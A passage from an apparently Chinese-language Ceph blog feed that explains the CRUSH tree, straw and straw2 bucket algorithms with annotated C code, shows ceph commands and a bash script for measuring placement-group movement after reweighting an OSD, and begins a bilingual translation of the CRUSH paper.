在二进制表示中，如果最低位是1，则节点是叶子节点。</span><br>    <span class="hljs-keyword">while</span> (!terminal(n)) &#123;<br>        <span class="hljs-type">int</span> l;<br><br>        <span class="hljs-comment">// 获取当前节点的权重</span><br>        w = bucket-&gt;node_weights[n];<br><br>        <span class="hljs-comment">// 计算哈希值，然后乘以节点的权重。</span><br>        <span class="hljs-comment">// 该哈希函数考虑了桶的哈希类型、对象ID、节点索引、随机种子和桶ID。</span><br>        t = (__u64)crush_hash32_4(bucket-&gt;h.hash, x, n, r, bucket-&gt;h.id) * (__u64)w;<br><br>        <span class="hljs-comment">// 将 64 位结果右移 32 位，以缩减范围，使其适应权重的规模。</span><br>        t = t &gt;&gt; <span class="hljs-number">32</span>;<br><br>        <span class="hljs-comment">// 计算左子节点的索引。</span><br>        l = left(n);<br><br>        <span class="hljs-comment">// 如果计算得到的哈希值小于左子节点的权重，则选择左子节点，</span><br>        <span class="hljs-comment">// 否则选择右子节点 (n = right(n);)。</span><br>        <span class="hljs-comment">// </span><br>        <span class="hljs-comment">// 假设当前节点权重为 0.6 ， 左子节点权重为 0.4 ， 右子节点权重为 0.2 ,</span><br>        <span class="hljs-comment">// 如果当前计算的 t 为 0.3 ，可以说明要寻找的节点位于左子节点树中；</span><br>        <span class="hljs-comment">// 如果当前计算的 t 为 0.5 ，可以说明要寻找的节点位于右子节点树中；</span><br>        <span class="hljs-keyword">if</span> (t &lt; bucket-&gt;node_weights[l])<br>            n = l;<br>        <span class="hljs-keyword">else</span><br>            n = right(n);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> bucket-&gt;h.items[n &gt;&gt; <span class="hljs-number">1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-4、Straw-Buckets"><a href="#3-4、Straw-Buckets" class="headerlink" title="3.4、Straw Buckets"></a>3.4、Straw Buckets</h2><p><code>list buckes</code> 和 <code>tree buckets</code> 的结构使得只需计算有限数量的哈希值并将其与权重进行比较，即可选择桶中的项目。在这样做的过程中，它们会采用分治法，要么优先考虑某些项目（例如，位于列表开头的项目），要么完全无需考虑项目的整个子树。这可以提高副本放置过程的性能，但当桶的内容由于项目的添加、移除或重新调整权重而发生变化时，也可能导致重组行为不理想。</p><p><code>straw buckets</code> 让所有物品都能公平 “竞争” 。通过类似于抽签的过程，每个桶中的项目都会相互竞争以放置副本。要放置副本，需要为桶中的每个项目抽取一根随机长度的签。获取最长签的项目获胜。每根签的长度最初都是一个固定范围内的值，基于 <code>CRUSH</code> 输入 x、副本数量 r 和桶中项目 i 的哈希值。每根签的长度都会根据项目的权重乘以因子，这样权重较大的项目更有可能获胜。虽然此过程（平均而言）几乎比 <code>list buckets </code>慢两倍，甚至比 <code>tree buckets</code> （以对数方式缩放）更慢，但 <code>straw buckets</code> 在修改嵌套项目时可实现最佳数据移动。</p><p><code>straw buckets</code> 的中代码在于签长的计算与选择。相关函数为 <code>int crush_calc_straw(struct crush_map* map, struct crush_bucket_straw* bucket)</code> 。</p><p><strong>选择元素的相关伪代码如下:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">max_x = <span class="hljs-number">-1</span><br>max_item = <span class="hljs-number">-1</span><br><span class="hljs-keyword">for</span> each item:<br>　　x = hash(input, r)<br>　　x = x * item_straw<br>　　<span class="hljs-keyword">if</span> x &gt; max_x<br>　　　　max_x = x<br>　　　　max_item = item<br><span class="hljs-keyword">return</span> max_item<br></code></pre></td></tr></table></figure><p><strong>代码解析:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> crush_bucket_straw* <span class="hljs-title function_">crush_make_straw_bucket</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>, <span class="hljs-type">int</span> hash, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> size, <span class="hljs-type">int</span>* items, <span class="hljs-type">int</span>* weights)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">crush_add_straw_bucket_item</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> crush_bucket_straw* bucket, <span class="hljs-type">int</span> item, <span class="hljs-type">int</span> weight)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">crush_remove_straw_bucket_item</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> crush_bucket_straw* bucket, <span class="hljs-type">int</span> item)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">crush_adjust_straw_bucket_item_weight</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> crush_bucket_straw* bucket, <span class="hljs-type">int</span> item, <span class="hljs-type">int</span> weight)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">crush_reweight_straw_bucket</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> crush_bucket_straw* bucket)</span>;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bucket_straw_choose</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> crush_bucket_straw* bucket, <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> r)</span><br>&#123;<br>    __u32 i;<br>    <span class="hljs-type">int</span> high = <span class="hljs-number">0</span>;<br>    __u64 high_draw = <span class="hljs-number">0</span>;<br>    __u64 draw;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; bucket-&gt;h.size; i++) &#123;<br>        draw = crush_hash32_3(bucket-&gt;h.hash, x, bucket-&gt;h.items[i], r);<br>        draw &amp;= <span class="hljs-number">0xffff</span>;<br>        draw *= bucket-&gt;straws[i];<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> || draw &gt; high_draw) &#123;<br>            high = i;<br>            high_draw = draw;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> bucket-&gt;h.items[high];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-5、Straw2-Buckets"><a href="#3-5、Straw2-Buckets" class="headerlink" title="3.5、Straw2 Buckets"></a>3.5、Straw2 Buckets</h2><p>默认的 bucket 算法。</p><p><strong>选择元素的相关伪代码如下:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">max_x = <span class="hljs-number">-1</span><br>max_item = <span class="hljs-number">-1</span><br><span class="hljs-keyword">for</span> each item:<br>　　x = hash(input, r)<br>　　x = ln(x/<span class="hljs-number">65536</span>) / weight<br>　　<span class="hljs-keyword">if</span> x &gt; max_x<br>　　　　max_x = x<br>　　　　max_item = item<br><span class="hljs-keyword">return</span> max_item<br></code></pre></td></tr></table></figure><p><strong>代码解析:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> crush_bucket_straw2* <span class="hljs-title function_">crush_make_straw2_bucket</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>, <span class="hljs-type">int</span> hash, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> size, <span class="hljs-type">int</span>* items, <span class="hljs-type">int</span>* weights)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">crush_add_straw2_bucket_item</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> crush_bucket_straw2* bucket, <span class="hljs-type">int</span> item, <span class="hljs-type">int</span> weight)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">crush_remove_straw2_bucket_item</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> crush_bucket_straw2* bucket, <span class="hljs-type">int</span> item)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">crush_adjust_straw2_bucket_item_weight</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> crush_bucket_straw2* bucket, <span class="hljs-type">int</span> item, <span class="hljs-type">int</span> weight)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">crush_reweight_straw2_bucket</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> crush_bucket_straw2* bucket)</span>;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bucket_straw2_choose</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> crush_bucket_straw2* bucket, <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> r, <span class="hljs-comment">// 3</span></span><br><span class="hljs-params">                                <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> crush_choose_arg* arg, <span class="hljs-type">int</span> position)</span> <span class="hljs-comment">// 5</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i, high = <span class="hljs-number">0</span>;<br>    __s64 draw, high_draw = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 获取 bucket 中元素的权重数组。</span><br>    <span class="hljs-comment">// 就可以通过 ceph osd crush weight-set dump 命令查看预设的 weights 信息，</span><br>    <span class="hljs-comment">// 如果之前没有设置过 weights ，则使用 bucket 中自带的 weights 信息。</span><br>    __u32* weights = get_choose_arg_weights(bucket, arg, position);<br><br>    <span class="hljs-comment">// 获取 bucket 中元素索引数组。</span><br>    __s32* ids = get_choose_arg_ids(bucket, arg);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; bucket-&gt;h.size; i++) &#123;<br>        dprintk(<span class="hljs-string">&quot;weight 0x%x item %d\n&quot;</span>, weights[i], ids[i]);<br>        <span class="hljs-comment">// 计算 bucket 中每个元素的签长。</span><br>        <span class="hljs-comment">// </span><br>        <span class="hljs-comment">// 计算规则为: (2^44 * log2((hash(x, ids[i], r) &amp; 0xffff) + 1) - 2^48) / weights[i] 。</span><br>        <span class="hljs-comment">// 精简后的规则为: log2(hash(x, ids[i], r) &amp; 0xffff) / weight 。</span><br>        <span class="hljs-comment">// </span><br>        <span class="hljs-comment">// 从这里可以看出，从 bucket 中筛选元素的时候，仅使用 bucket 中每个元素的自身的权重，不考虑其他</span><br>        <span class="hljs-comment">// bucket 中的元素的权重。</span><br>        <span class="hljs-keyword">if</span> (weights[i]) &#123; draw = generate_exponential_distribution(bucket-&gt;h.hash, x, ids[i], r, weights[i]); &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            draw = S64_MIN;<br>        &#125;<br><br>        <span class="hljs-comment">// 找到最大的签长</span><br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> || draw &gt; high_draw) &#123;<br>            high = i;<br>            high_draw = draw;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 返回最大签长对应的元素</span><br>    <span class="hljs-keyword">return</span> bucket-&gt;h.items[high];<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="四、数据迁移实践分析"><a href="#四、数据迁移实践分析" class="headerlink" title="四、数据迁移实践分析"></a>四、数据迁移实践分析</h1><h2 id="4-1、调整-bucket-算法"><a href="#4-1、调整-bucket-算法" class="headerlink" title="4.1、调整 bucket 算法"></a>4.1、调整 bucket 算法</h2><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 获取 crush map</span><br><span class="hljs-built_in">rm</span> -rf crushmap.file crushmap-human.file<br>ceph osd getcrushmap -o crushmap.file<br>crushtool -d crushmap.file -o crushmap-human.file<br><span class="hljs-built_in">cat</span> crushmap-human.file<br><br><span class="hljs-comment"># 修改 crush map</span><br><span class="hljs-built_in">rm</span> -rf crushmap-modified.file<br>vi crushmap-human.file<br>crushtool -c crushmap-human.file -o crushmap-modified.file<br>ceph osd setcrushmap -i crushmap-modified.file<br><br><span class="hljs-comment"># 调整并检查 tunables 配置</span><br><span class="hljs-comment"># 可以将 tunables 设置为 hammer/jewel/default </span><br><span class="hljs-comment"># 其中 default 指的是 jewel</span><br><span class="hljs-comment"># 从 hammer 开始才开始支持 straw2 算法</span><br>ceph osd crush tunables jewel<br><span class="hljs-comment"># straw_calc_version 仅支持 0 或者 1</span><br>ceph osd crush set-tunable straw_calc_version 1<br><br><span class="hljs-comment"># 查看 bucket 算法</span><br>ceph osd crush dump | grep alg<br></code></pre></td></tr></table></figure><h2 id="4-2、触发数据迁移"><a href="#4-2、触发数据迁移" class="headerlink" title="4.2、触发数据迁移"></a>4.2、触发数据迁移</h2><p>我们可以通过调整 osd 权重来触发数据迁移。</p><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 重新平衡数据分布</span><br>ceph osd crush reweight-all<br><br><span class="hljs-comment"># 备份初始 pg 分布情况</span><br>ceph pg dump pgs | awk -F <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-string">&#x27;&#123;printf &quot;%-10s %-10s\n&quot;, $1, $17&#125;&#x27;</span> &gt; oringin<br><br><span class="hljs-comment"># 记录原始 osd 的权重</span><br>ceph osd tree<br><br><span class="hljs-comment"># 调整 osd 的权重</span><br><span class="hljs-comment"># 下一次测试前需要重置 osd 的权重</span><br>ceph osd crush reweight osd.0 0<br><br><span class="hljs-comment"># 等待一会，再获取新的 pg 分布情况</span><br>ceph pg dump pgs | awk -F <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-string">&#x27;&#123;printf &quot;%-10s %-10s\n&quot;, $1, $17&#125;&#x27;</span> &gt; new<br></code></pre></td></tr></table></figure><h2 id="4-3、数据分析"><a href="#4-3、数据分析" class="headerlink" title="4.3、数据分析"></a>4.3、数据分析</h2><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用下面的脚本详细分析修改前后 pg 分布的差异</span><br>./check.sh oringin new<br></code></pre></td></tr></table></figure><p><strong>pg 变化分析脚本:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$#</span> -ne 2 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: <span class="hljs-variable">$0</span> &lt;original_file&gt; &lt;new_file&gt;&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br>original_file=<span class="hljs-variable">$1</span><br>new_file=<span class="hljs-variable">$2</span><br><br><span class="hljs-comment"># 打印表头</span><br><span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%-8s %-12s %-12s %-12s %-12s %-12s\n&quot;</span> <span class="hljs-string">&quot;Line&quot;</span> <span class="hljs-string">&quot;Origin&quot;</span> <span class="hljs-string">&quot;New&quot;</span> <span class="hljs-string">&quot;Removed&quot;</span> <span class="hljs-string">&quot;Added&quot;</span> <span class="hljs-string">&quot;OrderChanged&quot;</span><br><br><span class="hljs-comment"># 直接处理diff命令的输出</span><br>diff <span class="hljs-string">&quot;<span class="hljs-variable">$original_file</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$new_file</span>&quot;</span> -y -W 50 --suppress-common-lines | <span class="hljs-keyword">while</span> IFS= <span class="hljs-built_in">read</span> -r line; <span class="hljs-keyword">do</span><br>    <span class="hljs-comment"># 提取行号</span><br>    line_number=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br><br>    <span class="hljs-comment"># 提取前后的数字列表</span><br>    front_original=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> | grep -o <span class="hljs-string">&#x27;\[[^]]*\]&#x27;</span> | <span class="hljs-built_in">head</span> -n1)<br>    back_original=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> | grep -o <span class="hljs-string">&#x27;\[[^]]*\]&#x27;</span> | <span class="hljs-built_in">tail</span> -n1)<br><br>    front_array=($(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$front_original</span>&quot;</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;[]&#x27;</span> | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27;,&#x27;</span> <span class="hljs-string">&#x27; &#x27;</span>))<br>    back_array=($(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$back_original</span>&quot;</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;[]&#x27;</span> | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27;,&#x27;</span> <span class="hljs-string">&#x27; &#x27;</span>))<br><br>    <span class="hljs-comment"># 初始化输出变量</span><br>    removed=<span class="hljs-string">&quot;-&quot;</span><br>    added=<span class="hljs-string">&quot;-&quot;</span><br>    order_changed=<span class="hljs-string">&quot;No&quot;</span><br><br>    <span class="hljs-comment"># 找出新增和删除的数字</span><br>    removed_nums=()<br>    added_nums=()<br>    all_numbers=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;front_array[*]&#125;</span> <span class="hljs-variable">$&#123;back_array[*]&#125;</span>&quot;</span> | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-string">&#x27;\n&#x27;</span> | <span class="hljs-built_in">sort</span> -n | <span class="hljs-built_in">uniq</span>)<br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-variable">$all_numbers</span>; <span class="hljs-keyword">do</span><br>        count_front=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;front_array[*]&#125;</span>&quot;</span> | grep -o <span class="hljs-string">&quot;\b<span class="hljs-variable">$num</span>\b&quot;</span> | <span class="hljs-built_in">wc</span> -l)<br>        count_back=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;back_array[*]&#125;</span>&quot;</span> | grep -o <span class="hljs-string">&quot;\b<span class="hljs-variable">$num</span>\b&quot;</span> | <span class="hljs-built_in">wc</span> -l)<br>        <br>        <span class="hljs-keyword">if</span> (( count_front &gt; count_back )); <span class="hljs-keyword">then</span><br>            removed_nums+=(<span class="hljs-string">&quot;<span class="hljs-variable">$num</span>&quot;</span>)<br>        <span class="hljs-keyword">elif</span> (( count_front &lt; count_back )); <span class="hljs-keyword">then</span><br>            added_nums+=(<span class="hljs-string">&quot;<span class="hljs-variable">$num</span>&quot;</span>)<br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">done</span><br><br>    <span class="hljs-comment"># 设置 Removed 和 Added</span><br>    [[ <span class="hljs-variable">$&#123;#removed_nums[@]&#125;</span> -gt 0 ]] &amp;&amp; removed=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;removed_nums[*]&#125;</span>&quot;</span><br>    [[ <span class="hljs-variable">$&#123;#added_nums[@]&#125;</span> -gt 0 ]] &amp;&amp; added=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;added_nums[*]&#125;</span>&quot;</span><br><br>    <span class="hljs-comment"># 找出在两个数组中共同存在的元素</span><br>    common_elements=()<br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;front_array[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>        <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot; <span class="hljs-variable">$&#123;back_array[*]&#125;</span> &quot;</span> =~ <span class="hljs-string">&quot; <span class="hljs-variable">$num</span> &quot;</span> ]]; <span class="hljs-keyword">then</span><br>            common_elements+=(<span class="hljs-string">&quot;<span class="hljs-variable">$num</span>&quot;</span>)<br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">done</span><br><br>    <span class="hljs-comment"># 检查共同元素的索引位置是否一致</span><br>    <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$&#123;#common_elements[@]&#125;</span> -gt 0 ]]; <span class="hljs-keyword">then</span><br>        <span class="hljs-comment"># 获取每个共同元素在两个数组中的索引</span><br>        <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;common_elements[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>            <span class="hljs-comment"># 在front_array中查找该元素的索引</span><br>            <span class="hljs-keyword">for</span> ((i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-variable">$&#123;#front_array[@]&#125;</span>; i++)); <span class="hljs-keyword">do</span><br>                <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;front_array[$i]&#125;</span>&quot;</span> == <span class="hljs-string">&quot;<span class="hljs-variable">$num</span>&quot;</span> ]]; <span class="hljs-keyword">then</span><br>                    front_index=<span class="hljs-variable">$i</span><br>                    <span class="hljs-built_in">break</span><br>                <span class="hljs-keyword">fi</span><br>            <span class="hljs-keyword">done</span><br>            <br>            <span class="hljs-comment"># 在back_array中查找该元素的索引</span><br>            <span class="hljs-keyword">for</span> ((i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-variable">$&#123;#back_array[@]&#125;</span>; i++)); <span class="hljs-keyword">do</span><br>                <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;back_array[$i]&#125;</span>&quot;</span> == <span class="hljs-string">&quot;<span class="hljs-variable">$num</span>&quot;</span> ]]; <span class="hljs-keyword">then</span><br>                    back_index=<span class="hljs-variable">$i</span><br>                    <span class="hljs-built_in">break</span><br>                <span class="hljs-keyword">fi</span><br>            <span class="hljs-keyword">done</span><br>            <br>            <span class="hljs-comment"># 如果索引位置不同，则标记为顺序变化</span><br>            <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$front_index</span>&quot;</span> != <span class="hljs-string">&quot;<span class="hljs-variable">$back_index</span>&quot;</span> ]]; <span class="hljs-keyword">then</span><br>                order_changed=<span class="hljs-string">&quot;Yes&quot;</span><br>                <span class="hljs-built_in">break</span><br>            <span class="hljs-keyword">fi</span><br>        <span class="hljs-keyword">done</span><br>    <span class="hljs-keyword">fi</span><br><br>    <span class="hljs-comment"># 输出格式化结果</span><br>    <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%-8s %-12s %-12s %-12s %-12s %-12s\n&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line_number</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$front_original</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$back_original</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$removed</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$added</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$order_changed</span>&quot;</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><strong>脚本的示例输出信息:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz.host crush]# ./check.sh oringin new<br>Line     Origin       New          Removed      Added        OrderChanged<br>2.38     [5,0,2]      [5,1,2]      0            1            No<br>2.37     [0,5,2]      [1,5,2]      0            1            No<br>2.35     [2,5,0]      [2,5,1]      0            1            No<br>2.34     [5,3,0]      [5,3,1]      0            1            No<br>2.30     [2,4,0]      [2,4,1]      0            1            No<br>2.2f     [1,3,5]      [5,3,1]      -            -            Yes<br>2.2d     [0,5,2]      [5,1,2]      0            1            Yes<br>2.2b     [2,0,4]      [2,1,4]      0            1            No<br>2.29     [1,3,5]      [4,3,1]      5            4            Yes<br>2.28     [3,0,4]      [3,4,1]      0            1            Yes<br>2.27     [1,3,5]      [1,3,4]      5            4            No<br>2.26     [5,1,2]      [5,2,1]      -            -            Yes<br>2.25     [2,1,5]      [2,5,1]      -            -            Yes<br>2.24     [1,4,3]      [1,4,2]      3            2            No<br>2.1f     [4,3,0]      [4,3,1]      0            1            No<br>3.1e     [3,0,5]      [3,4,1]      0 5          1 4          No<br>4.19     [0,2,5]      [5,2,1]      0            1            Yes<br>2.1e     [3,5,0]      [3,5,1]      0            1            No<br>4.18     [0,4,3]      [2,4,1]      0 3          1 2          No<br>3.1c     [2,0,4]      [2,1,4]      0            1            No<br>4.1b     [4,3,0]      [4,3,1]      0            1            No<br>2.1c     [0,4,2]      [1,5,2]      0 4          1 5          No<br>3.1d     [1,2,5]      [5,2,1]      -            -            Yes<br>4.1a     [4,3,0]      [4,3,1]      0            1            No<br>2.b      [5,0,3]      [5,2,1]      0 3          1 2          No<br>3.a      [5,1,2]      [5,2,1]      -            -            Yes<br>2.a      [5,3,0]      [5,3,1]      0            1            No<br>3.b      [4,0,3]      [4,3,1]      0            1            Yes<br>2.9      [3,4,0]      [3,4,1]      0            1            No<br>3.8      [4,3,0]      [4,3,1]      0            1            No<br>4.f      [2,4,0]      [2,4,1]      0            1            No<br>2.8      [0,2,5]      [1,2,5]      0            1            No<br>3.9      [0,2,5]      [3,1,5]      0 2          1 3          No<br>2.7      [4,0,3]      [4,3,1]      0            1            Yes<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Ceph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>译 - CRUSH: Controlled, Scalable, Decentralized Placement of Replicated Data</title>
      <link href="/2023/06/20/crush/"/>
      <url>/2023/06/20/crush/</url>
      
        <content type="html"><![CDATA[<div><p>译作: <strong>可控的、可扩展的、分布式的副本数据放置算法</strong>，<a href="https://ceph.com/assets/pdfs/weil-crush-sc06.pdf">论文原文</a> 。 该论文于 2006 年 11 月发布于 SC2006 。</p><p>CRUSH 是一种用于大规模分布式存储系统的数据分布算法，它通过伪随机函数将数据对象映射到存储设备上，无需依赖中央目录。CRUSH 算法设计考虑了系统的动态性，支持在添加或移除存储设备时高效地重组数据，并最小化不必要的数据移动。此外，CRUSH 支持多种数据复制和可靠性机制，并允许根据用户定义的策略进行数据分布，这些策略能够在故障域之间有效地分离副本，增强数据安全性。</p><p>CRUSH 的核心是其层级集群图，该图描述了存储集群的物理和逻辑结构，并通过一系列规则来确定数据的放置位置。CRUSH 算法通过将数据均匀分布在加权设备上，保持存储和设备带宽资源的平衡利用。算法还考虑了设备的故障和过载情况，能够在设备发生故障或过载时重新分配数据，避免数据丢失并优化系统性能。</p><p>CRUSH 的映射性能高效，计算复杂度为 O(logn) ，适用于管理大规模（多 PB 级）的存储系统。CRUSH的设计不仅提高了系统的可扩展性和性能，还通过智能的数据分布策略提高了系统的可靠性和数据安全性。</p></div><h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>Emerging large-scale distributed storage systems are faced with the task of distributing petabytes of data among tens or hundreds of thousands of storage devices. Such systems must evenly distribute data and workload to efficiently utilize available resources and maximize system performance, while facilitating system growth and managing hardware failures. We have developed CRUSH, a scalable pseudorandom data distribution function designed for distributed object-based storage systems that efficiently maps data objects to storage devices without relying on a central directory. Because large systems are inherently dynamic, CRUSH is designed to facilitate the addition and removal of storage while minimizing unnecessary data movement. The algorithm accommodates a wide variety of data replication and reliability mechanisms and distributes data in terms of userdefined policies that enforce separation of replicas across failure domains.</p><p>新兴的大规模分布式存储系统面临着在数万甚至数十万个存储设备之间分发 PB 级数据的任务。此类系统必须均匀分布数据和工作负载，以高效利用可用资源并最大化系统性能，同时促进系统增长并管理硬件故障。我们开发了 CRUSH，这是一种可扩展的伪随机数据分布函数，专为基于对象的分布式存储系统而设计，它无需依赖中央目录即可高效地将数据对象映射到存储设备。由于大型系统本质上是动态的，CRUSH 旨在方便存储的添加和移除，同时最大限度地减少不必要的数据移动。该算法兼容各种数据复制和可靠性机制，并根据用户定义的策略分发数据，这些策略强制在故障域之间分离副本。</p><h1 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h1><p>Object-based storage is an emerging architecture that promises improved manageability, scalability, and performance [Azagury et al. 2003]. Unlike conventional blockbased hard drives, object-based storage devices (OSDs) manage disk block allocation internally, exposing an interface that allows others to read and write to variably-sized, named objects. In such a system, each file’s data is typically striped across a relatively small number of named objects distributed throughout the storage cluster. Objects are replicated across multiple devices (or employ some other data redundancy scheme) in order to protect against data loss in the presence of failures. Object-based storage systems simplify data layout by replacing large block lists with small object lists and distributing the low-level block allocation problem. Although this vastly improves scalability by reducing file allocation metadata and complexity, the funda mental task of distributing data among thousands of storage devices—typically with varying capacities and performance characteristics—remains.</p><p>基于对象的存储是一种新兴架构，有望提升可管理性、可扩展性和性能 [Azagury et al. 2003]。与传统的基于块的硬盘不同，基于对象的存储设备 (OSD) 